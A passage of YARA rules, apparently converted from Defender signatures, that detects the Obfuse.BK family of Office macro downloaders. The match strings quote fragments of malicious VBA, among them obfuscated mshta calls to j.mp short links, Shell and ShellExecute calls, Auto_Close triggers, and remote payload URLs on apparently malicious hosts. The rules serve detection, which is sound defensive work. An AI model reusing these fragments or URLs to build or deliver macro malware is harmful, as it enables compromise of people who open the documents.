        $x_1_2 = "ZS = ZS & " ascii //weight: 1
        $x_1_3 = "j___h = Chr(n___o - 77)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "zuQkQxuNb5D_RW.oiKpJXHGAtdZYRhWn55D" ascii //weight: 1
        $x_1_2 = "mxc_er = Chr(nv - 64)" ascii //weight: 1
        $x_1_3 = ".Run(" ascii //weight: 1
        $x_1_4 = "kJ = kJ &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Coys_i.uNP_f_k_ugdJb_k9FHkj" ascii //weight: 1
        $x_1_2 = "hjda = Chr(ds - 30)" ascii //weight: 1
        $x_1_3 = ".Run(mrD_R_aLueF4, vBZ___jU4KPUTw)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "E5EN_.SodUux_REp__Z_ARCqyP" ascii //weight: 1
        $x_1_2 = "vcb = Chr(asd - 7)" ascii //weight: 1
        $x_1_3 = ".Run(OynIwt4NYsXQHU, fu7UhGaUpAhRarZEI)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "tpkm = tpkm &" ascii //weight: 1
        $x_1_2 = ".Run(idimqszsifynt, rtccibnugxqvtcwtilrbgqhcwke)" ascii //weight: 1
        $x_1_3 = "d__as = ChrW(l__k - 62)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "U__27jWt2.y_OqwD9Oaak_TKKAJwhk" ascii //weight: 1
        $x_1_2 = "hjda = Chr(ds - 30)" ascii //weight: 1
        $x_1_3 = ".Run(LWVoZiBZ_N_, H3leXgsyKY_EyTmc)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "WbQZrn8I4K_Z53_JUxSMOuOp38z9_.jtsg9vP_6j7DIoJnHmEiH4PaM" ascii //weight: 1
        $x_1_2 = "mk_ll = Chr(hf - 61)" ascii //weight: 1
        $x_1_3 = "TT = TT &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "m7K_ZdKWYwDhiaMS_h4_D8Ym_99.W46_mWegKSVz_wu_F2oVTUjIUKEQE" ascii //weight: 1
        $x_1_2 = "q8 = q8 & " ascii //weight: 1
        $x_1_3 = "mk_ll = Chr(hf - 61)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_10
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 6f 70 6f 70 6f 20 2b 20 6d 6b 73 6d 64 61 73 20 2b 20 6a 64 73 61 6b 64 61 77 20 2b 20 22 74 61 20 68 74 74 70 3a 2f 2f 25 32 30 25 32 30 40 6a 2e 6d 70 2f [0-30] 22}  //weight: 1, accuracy: Low
        $x_1_2 = "= \"m\"" ascii //weight: 1
        $x_1_3 = "= \"s\"" ascii //weight: 1
        $x_1_4 = "= \"h\"" ascii //weight: 1
        $x_1_5 = "Shell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_11
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= feixbto + so1 + ho2 + \"ta http://%20%20@j.mp/sdhja67xzhjdas\"" ascii //weight: 1
        $x_1_2 = "= \"m\"" ascii //weight: 1
        $x_1_3 = "= \"s\"" ascii //weight: 1
        $x_1_4 = "= \"h\"" ascii //weight: 1
        $x_1_5 = "Shell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_12
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ysbjIBITlH8SKLbIB_K.AgPY5FeQh_eDuy65uvTuEd" ascii //weight: 1
        $x_1_2 = "hgrt = Chr(hgf - 7)" ascii //weight: 1
        $x_1_3 = "= \"Wscript.Shell\"" ascii //weight: 1
        $x_1_4 = "iR = iR &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_13
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "LeXmaPeaK.ot9_YlQ_Nw7lVBupf_PT" ascii //weight: 1
        $x_1_2 = "hjda = Chr(ds - 30)" ascii //weight: 1
        $x_1_3 = ".Run(Dgi9_BcugUYt6_, GJW7Z_SBr1_WxgJAY3cUE)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_14
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "xs_____G = ChrW(m_____n - 69)" ascii //weight: 1
        $x_1_2 = ".Run(lcwfidxkblfkbokvjwlqqrdhvkwefnqlgyh, nofppxuujxzcsljkbkbtaukjbxxkjmwe)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_15
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "P_qAlzr9xWTj5.OhXPkJ2soqpu5RGtRvD3a9kd" ascii //weight: 1
        $x_1_2 = ".Run(vAwk7RurNrSDa6OMPrQRWdDBCY4cwk5dEoWVfejBnm7noZd_C" ascii //weight: 1
        $x_1_3 = "CL = CL &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_16
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "LwWntQwddYnxuvZiZs_6T3.u_XHtTMavFimTbENQLNuAzJBNA5SR" ascii //weight: 1
        $x_1_2 = "h_uik = Chr(vf - 50)" ascii //weight: 1
        $x_1_3 = ".Run(kfJh8N9BsJiQ6jQs9rRgnSPd_" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_17
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ano = ano & " ascii //weight: 1
        $x_1_2 = ".Run(wvwlnmlsdyvafefvudnjbnseadtm, fnlblgogzjxuhzbivorfxwduvnekwwgorjtfxxq)" ascii //weight: 1
        $x_1_3 = "= Chr(bgfbg - 114)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_18
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Replace(nEAacyWypNGnso_UqQKY." ascii //weight: 1
        $x_1_2 = "= IsDate(IsNumeric" ascii //weight: 1
        $x_1_3 = "= nEAacyWypNGnso_UqQKY.mfbZHmaVft" ascii //weight: 1
        $x_1_4 = ".ShowWindow = CLng((" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_19
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "IHvURPI84kP5_.oTkH6ZI4EOuZK3r_tOZL" ascii //weight: 1
        $x_1_2 = "D__S = Chr(SA - 100)" ascii //weight: 1
        $x_1_3 = ".Run(jlwJqWH8z49IxRGM3ToEubSDc8kg_ZKwnNMgwuWgWgW1jB1p" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_20
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= NnUxs.rLHLV(yFxg, yFxg2)" ascii //weight: 1
        $x_1_2 = "= CreateObject(dfjkdsf() + klsdk() + wlfff())" ascii //weight: 1
        $x_1_3 = ".ShellExecute \"P\" + n1, A2, \"\", \"\", 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_21
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 22 20 2b 20 22 6d 22 20 2b 20 22 73 22 20 2b 20 22 68 74 61 2e 65 78 65 20 68 74 74 70 73 3a 5c 5c 25 34 30 25 34 30 22 20 2b 20 22 25 34 30 25 22 20 2b 20 22 34 30 40 6a 2e 6d 22 20 2b 20 22 70 5c 22 20 2b 20 22 [0-10] 22 20 2b 20 22 [0-10] 22 2c 20 34 29}  //weight: 1, accuracy: Low
        $x_1_2 = "Sub Auto_Close()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_22
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"Msxml2.DOMDocument.3.0\")" ascii //weight: 1
        $x_1_2 = "DCUGzU.Load \"http://moonshine-mht.best/chrome.jpg\"" ascii //weight: 1
        $x_1_3 = ".transformNode (DCUGzU)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_23
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "S3V3OObrd1r_l4ml87ucTVAxbrq.yaAyuRMyD8YZvB_ikYn5" ascii //weight: 1
        $x_1_2 = "D__S = Chr(SA - 100)" ascii //weight: 1
        $x_1_3 = ".Run(PbbnZ__KhSAMT3H_nl5z9wwQKcIuDMUGkrwz2hCN" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_24
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Function b___v(ds As Integer)" ascii //weight: 1
        $x_1_2 = "iKjXyxNgPUZX.CiuzitOKTEbOgjM6_YV_nGSkvm7_y" ascii //weight: 1
        $x_1_3 = ".Run(wO_PDqGWRYgXz669ubYzj_NMNaWsMSE11Xew3W" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_25
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KiePQDaxp.Open koNw8MArO, KMhosvfnb, False, \"username\", \"Password\"" ascii //weight: 1
        $x_1_2 = "= \"https://ghghghfhfhfh.000webhostapp.com/DHL QA-Tracker.gif\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_26
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "xdrc4Sru1HRLeecuDNwnx2Q4a.rDuIq_Al_2kA_C5v2p_brrt" ascii //weight: 1
        $x_1_2 = "= CreateObject(GisP5AJ13Nn_UY74y9QsYXRERtBX8V8zARX5jU" ascii //weight: 1
        $x_1_3 = ".Run(tHdAlA1iJNrMUQZN" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_27
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Replace(L__RbW_aNAuxYO_ay." ascii //weight: 1
        $x_1_2 = "Open Application.ActiveWorkbook.Path" ascii //weight: 1
        $x_1_3 = "qZHmqWvzV.xFD_ik_ZXAfwcYybWPsHFjHZeND" ascii //weight: 1
        $x_1_4 = ".ShowWindow = CLng((" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_28
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= ActiveCell.Offset(iC, 1).Value" ascii //weight: 1
        $x_1_2 = "= UserForm2.Frame2.Tag" ascii //weight: 1
        $x_1_3 = "ShellObj.ShellExecute x, yyy" ascii //weight: 1
        $x_1_4 = "Private Sub UserForm_Click()" ascii //weight: 1
        $x_1_5 = "Sleep 2000" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_29
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Replace(m_RuxYPBSkLAEmQGstoRvY_lXWpPRM." ascii //weight: 1
        $x_1_2 = "Open Application.ActiveWorkbook.Path" ascii //weight: 1
        $x_1_3 = "= FyCKpfdUSXgtxn_VXh.pj_cqzh" ascii //weight: 1
        $x_1_4 = ".ShowWindow = CLng((" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_30
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Replace(Pcqws_OFmUIsjibYUk." ascii //weight: 1
        $x_1_2 = "Open Application.ActiveWorkbook.Path" ascii //weight: 1
        $x_1_3 = "= Pcqws_OFmUIsjibYUk.SIHITsJLhhVgTPkAOYOvh" ascii //weight: 1
        $x_1_4 = ".ShowWindow = CLng((" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_31
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Replace(PSf_iEYL_KoHesjUBlUgHNuc_lW." ascii //weight: 1
        $x_1_2 = "Open Application.ActiveWorkbook.Path" ascii //weight: 1
        $x_1_3 = "= IsArray(IsNumeric(" ascii //weight: 1
        $x_1_4 = "= gtl__OEfqv_gHBzVRZEIbulzn_apdb." ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_32
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= feixb + so + ho + \"ta http://%20%20@j.mp/asdaksasdasdodkasodkaos\"" ascii //weight: 1
        $x_1_2 = "feixb = \"m\"" ascii //weight: 1
        $x_1_3 = "so = \"s\"" ascii //weight: 1
        $x_1_4 = "ho = \"h\"" ascii //weight: 1
        $x_1_5 = "Call Shell" ascii //weight: 1
        $x_1_6 = "Sub Auto_Close()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_33
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Replace(NlcZkHAGaK.mxqjqZhWQITk_p_pzh_sbE" ascii //weight: 1
        $x_1_2 = "Open Application.ActiveWorkbook.Path" ascii //weight: 1
        $x_1_3 = "= nwYHtv_Lj.rsrclOxESgXGUfZXISSpr" ascii //weight: 1
        $x_1_4 = ".ShowWindow = CLng((" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_34
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".ShellExecute \"P\" + QKRfTQSGC(fjkerooos), QKRfTQSGC(fgfjhfgfg), \"\", \"\", 0" ascii //weight: 1
        $x_1_2 = "= ARFGioOWbVvUziYx(aSMasjrTWufl, t7gh0)" ascii //weight: 1
        $x_1_3 = "= QKRfTQSGC & Mid(s, p, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_35
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
